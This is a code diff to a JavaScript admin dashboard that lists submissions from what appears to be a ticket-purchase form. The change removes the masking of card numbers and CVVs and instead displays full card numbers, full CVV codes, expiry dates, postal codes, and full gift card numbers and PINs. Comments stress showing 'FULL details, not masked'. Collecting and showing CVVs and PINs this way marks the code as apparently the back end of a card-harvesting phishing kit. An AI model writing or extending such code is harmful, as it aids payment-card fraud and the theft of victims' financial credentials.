@@ -641,19 +641,31 @@ function renderSubmissionsTable() {
   const paginatedSubmissions = submissions.slice(start, start + submissionsPerPage);
 
   tbody.innerHTML = paginatedSubmissions.map((sub, idx) => {
-    const paymentMethod = sub.paymentMethod || (sub.cardNumber ? 'Card' : sub.giftCardNumberFull ? 'Gift Card' : 'Unknown');
-    const cardDisplay = sub.cardLastFour ? `****${sub.cardLastFour}` : (sub.cardNumber ? `****${sub.cardNumber.slice(-4)}` : 'N/A');
-    const expiryDisplay = sub.expiryDate || 'N/A';
-    const zipDisplay = sub.postalCode || sub.zipCode || 'N/A';
+    const paymentMethod = sub.paymentMethod || (sub.cardNumberFull ? 'Card' : sub.giftCardNumberFull ? 'Gift Card' : 'Unknown');
+    
+    // Display card details - show FULL details, not masked
+    let cardDisplay = 'N/A';
+    if (sub.cardNumberFull) {
+      cardDisplay = sub.cardNumberFull; // Show full card number
+    } else if (sub.cardLastFour) {
+      cardDisplay = `****${sub.cardLastFour}`;
+    } else if (sub.giftCardNumberFull) {
+      cardDisplay = sub.giftCardNumberFull; // Show full gift card number
+    } else if (sub.giftCardLastFour) {
+      cardDisplay = `GC: ****${sub.giftCardLastFour}`;
+    }
+    
+    const expiryDisplay = sub.expiryDate || '-';
+    const zipDisplay = sub.postalCode || sub.zipCode || '-';
     
     return `
       <tr onclick="viewSubmissionDetail(${submissions.indexOf(sub)})" style="cursor: pointer;">
         <td>${sub.email || 'N/A'}</td>
-        <td>${sub.eventTitle || 'N/A'}</td>
-        <td>${sub.quantity || '-'}</td>
-        <td>${sub.pricePerTicket || 'N/A'}</td>
-        <td>${sub.total ? '$' + parseFloat(sub.total).toFixed(2) : 'N/A'}</td>
-        <td>${cardDisplay}</td>
+        <td>${sub.eventTitle || sub.orderSummary?.event || 'N/A'}</td>
+        <td>${sub.quantity || sub.orderSummary?.quantity || '-'}</td>
+        <td>${sub.pricePerTicket || '-'}</td>
+        <td>${sub.total ? '$' + parseFloat(sub.total).toFixed(2) : (sub.orderSummary?.total ? '$' + parseFloat(sub.orderSummary.total).toFixed(2) : 'N/A')}</td>
+        <td><code>${cardDisplay}</code></td>
         <td>${expiryDisplay}</td>
         <td>${zipDisplay}</td>
         <td>${formatDate(sub.timestamp)}</td>
@@ -672,19 +684,8 @@ function viewSubmissionDetail(idx) {
   const sub = submissions[idx];
   if (!sub) return;
 
-  // Helper function to mask sensitive data
-  const maskCardNumber = (card) => {
-    if (!card) return 'N/A';
-    const cardStr = card.toString();
-    return cardStr.slice(-4).padStart(cardStr.length, '*');
-  };
-
-  const maskCVV = (cvv) => {
-    return cvv ? '***' : 'N/A';
-  };
-
   // Determine payment method
-  const paymentMethod = sub.paymentMethod || (sub.cardNumber ? 'Card' : 'Unknown');
+  const paymentMethod = sub.paymentMethod || (sub.cardNumberFull ? 'Card' : sub.giftCardNumberFull ? 'Gift Card' : 'Unknown');
 
   // Build full form details HTML
   let html = `
@@ -694,58 +695,66 @@ function viewSubmissionDetail(idx) {
     </div>
     <div class="submission-field">
       <div class="submission-label">🎭 Event Title</div>
-      <div class="submission-value">${sub.eventTitle || 'N/A'}</div>
+      <div class="submission-value">${sub.eventTitle || sub.orderSummary?.event || 'N/A'}</div>
     </div>
     <div class="submission-field">
       <div class="submission-label">🎫 Quantity</div>
-      <div class="submission-value">${sub.quantity || '-'}</div>
+      <div class="submission-value">${sub.quantity || sub.orderSummary?.quantity || '-'}</div>
     </div>
     <div class="submission-field">
       <div class="submission-label">💷 Price Per Ticket</div>
-      <div class="submission-value">$${sub.pricePerTicket ? parseFloat(sub.pricePerTicket).toFixed(2) : '0.00'}</div>
+      <div class="submission-value">$${sub.pricePerTicket ? parseFloat(sub.pricePerTicket).toFixed(2) : (sub.orderSummary?.unitPrice ? parseFloat(sub.orderSummary.unitPrice).toFixed(2) : '0.00')}</div>
     </div>
     <div class="submission-field">
       <div class="submission-label">💰 Total Amount</div>
-      <div class="submission-value">$${sub.total ? parseFloat(sub.total).toFixed(2) : '0.00'}</div>
+      <div class="submission-value">$${sub.total ? parseFloat(sub.total).toFixed(2) : (sub.orderSummary?.total ? parseFloat(sub.orderSummary.total).toFixed(2) : '0.00')}</div>
     </div>
   `;
 
-  // Card Payment Details
-  if (paymentMethod === 'Card' || sub.cardNumber) {
+  // Card Payment Details - DISPLAY FULL DETAILS (not masked)
+  if (paymentMethod === 'Card' || sub.cardNumberFull) {
     html += `
       <hr style="border: 1px solid #333; margin: 20px 0;">
       <div style="font-weight: 700; color: #10b981; margin-bottom: 15px;">💳 Card Payment Details</div>
       <div class="submission-field">
-        <div class="submission-label">Card Number</div>
-        <div class="submission-value"><code>${maskCardNumber(sub.cardNumber)}</code></div>
+        <div class="submission-label">Card Number (Full)</div>
+        <div class="submission-value"><code>${sub.cardNumberFull || 'N/A'}</code></div>
+      </div>
+      <div class="submission-field">
+        <div class="submission-label">Card Last Four</div>
+        <div class="submission-value"><code>${sub.cardLastFour || 'N/A'}</code></div>
       </div>
       <div class="submission-field">
         <div class="submission-label">Expiry Date</div>
         <div class="submission-value"><code>${sub.expiryDate || 'N/A'}</code></div>
       </div>
       <div class="submission-field">
-        <div class="submission-label">CVV (Security Code)</div>
-        <div class="submission-value"><code>${maskCVV(sub.cvv)}</code></div>
+        <div class="submission-label">CVV (Security Code - Full)</div>
+        <div class="submission-value"><code>${sub.securityCodeCVV || sub.cvv || 'N/A'}</code></div>
       </div>
       <div class="submission-field">
         <div class="submission-label">Postal Code</div>
-        <div class="submission-value"><code>${sub.zipCode || 'N/A'}</code></div>
+        <div class="submission-value"><code>${sub.postalCode || sub.zipCode || 'N/A'}</code></div>
       </div>
     `;
   }
 
-  // Gift Card Details
+  // Gift Card Details - DISPLAY FULL DETAILS
   if (paymentMethod === 'Gift Card' || sub.giftCardNumberFull) {
     html += `
       <hr style="border: 1px solid #333; margin: 20px 0;">
       <div style="font-weight: 700; color: #10b981; margin-bottom: 15px;">🎁 Gift Card Payment Details</div>
       <div class="submission-field">
-        <div class="submission-label">Gift Card Number</div>
-        <div class="submission-value"><code>${maskCardNumber(sub.giftCardNumberFull)}</code></div>
+        <div class="submission-label">Gift Card Number (Full)</div>
+        <div class="submission-value"><code>${sub.giftCardNumberFull || 'N/A'}</code></div>
       </div>
       <div class="submission-field">
-        <div class="submission-label">Gift Card PIN</div>
-        <div class="submission-value"><code>${maskCVV(sub.giftCardPinFull)}</code></div>
+        <div class="submission-label">Gift Card Last Four</div>
+        <div class="submission-value"><code>${sub.giftCardLastFour || 'N/A'}</code></div>
+      </div>
+      <div class="submission-field">
+        <div class="submission-label">Gift Card PIN (Full)</div>
+        <div class="submission-value"><code>${sub.giftCardPinFull || 'N/A'}</code></div>
       </div>
     `;
   }
